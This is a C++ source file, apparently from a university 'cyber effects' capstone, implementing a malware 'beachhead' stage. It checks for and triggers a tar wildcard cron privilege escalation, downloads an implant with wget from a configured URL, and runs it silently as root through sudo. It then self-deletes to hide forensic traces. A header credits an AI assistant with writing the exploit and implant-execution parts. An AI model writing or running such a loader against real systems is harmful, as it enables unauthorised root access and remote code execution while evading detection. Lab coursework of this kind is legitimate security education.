/*
 * COMPSCI564 - Cyber Effects Capstone Project
 * Beachhead - Initial Access Stage
 * 
 * AI Assistance Attribution:
 * This code was developed with assistance from Claude (Anthropic) for:
 * - Integration of privilege escalation checks
 * - Tar wildcard exploit execution
 * - Sudo-based implant execution
 * 
 * For educational use in controlled lab environment only.
 */

#include <cstdlib>
#include <string>
#include <unistd.h>
#include <sys/syscall.h>

#include "privesc_check.h"
#include "privesc.h"

// Helper to print status messages (can be removed for stealth)
static void log_status(const char* msg) {
    #ifdef DEBUG
    syscall(SYS_write, 2, msg, strlen(msg));  // Write to stderr
    syscall(SYS_write, 2, "\n", 1);
    #endif
}

int main() {
    // ========================================================================
    // STAGE 1: PRE-ESCALATION RECONNAISSANCE
    // ========================================================================
    log_status("[*] Stage 1: Checking privilege escalation conditions...");
    
    PrivEscConditions privesc_check = check_privesc_viability();
    
    // Log findings
    #ifdef DEBUG
    char msg_buf[256];
    snprintf(msg_buf, sizeof(msg_buf), 
             "[*] UID: %u | Backups writable: %s | Tar available: %s | Cron running: %s",
             privesc_check.current_uid,
             privesc_check.backups_dir_writable ? "YES" : "NO",
             privesc_check.tar_available ? "YES" : "NO",
             privesc_check.cron_running ? "YES" : "NO");
    log_status(msg_buf);
    #endif
    
    // ========================================================================
    // STAGE 2: PRIVILEGE ESCALATION (if conditions are favorable)
    // ========================================================================
    bool should_escalate = privesc_check.backups_dir_writable && 
                           privesc_check.tar_available && 
                           privesc_check.cron_running;
    
    if (should_escalate && privesc_check.current_uid != 0) {
        log_status("[*] Stage 2: Attempting privilege escalation...");
        
        if (execute_tar_privesc() == 0) {
            log_status("[+] Privilege escalation initiated. Waiting for cron...");
            
            // Check if escalation succeeded after waiting
            if (check_if_root()) {
                log_status("[+] Successfully escalated to root!");
            } else {
                log_status("[*] Privilege escalation pending (cron delay)...");
            }
        } else {
            log_status("[!] Privilege escalation setup failed");
        }
    } else if (privesc_check.current_uid == 0) {
        log_status("[+] Already running as root");
    } else {
        log_status("[!] Privilege escalation conditions not met, proceeding anyway");
    }
    
    // ========================================================================
    // STAGE 3: DOWNLOAD AND EXECUTE IMPLANT
    // ========================================================================
    log_status("[*] Stage 3: Downloading implant...");
    
    std::string url = URL;
    std::string implant_path = "/tmp/user.json";
    
    // Download implant using wget
    std::string download_cmd = "wget -q " + url + " -O " + implant_path;
    int download_result = std::system(download_cmd.c_str());
    
    if (download_result != 0) {
        log_status("[!] Failed to download implant");
        return 1;
    }
    
    log_status("[+] Implant downloaded successfully");
    
    // ========================================================================
    // STAGE 4: EXECUTE IMPLANT AS ROOT (if possible)
    // ========================================================================
    log_status("[*] Stage 4: Executing implant...");
    
    std::string execute_cmd;
    
    // Check if we can use sudo
    if (privesc_check.current_uid != 0 && should_escalate) {
        // Try to execute with sudo (the tar exploit creates sudoers entry)
        execute_cmd = "sudo python3 " + implant_path + " >/dev/null 2>&1 &";
        log_status("[*] Attempting to execute implant with sudo...");
    } else if (privesc_check.current_uid == 0) {
        // Already root, execute directly
        execute_cmd = "python3 " + implant_path + " >/dev/null 2>&1 &";
        log_status("[*] Executing implant as root...");
    } else {
        // Execute as current user
        execute_cmd = "python3 " + implant_path + " >/dev/null 2>&1 &";
        log_status("[*] Executing implant as current user...");
    }
    
    int exec_result = std::system(execute_cmd.c_str());
    
    if (exec_result == 0) {
        log_status("[+] Implant executed successfully");
    } else {
        log_status("[!] Implant execution may have failed");
    }
    
    // ========================================================================
    // CLEANUP: Remove beachhead binary
    // ========================================================================
    #ifndef DEBUG
    // Self-delete to reduce forensic footprint
    syscall(SYS_unlink, "/proc/self/exe");
    #endif
    
    return 0;
}
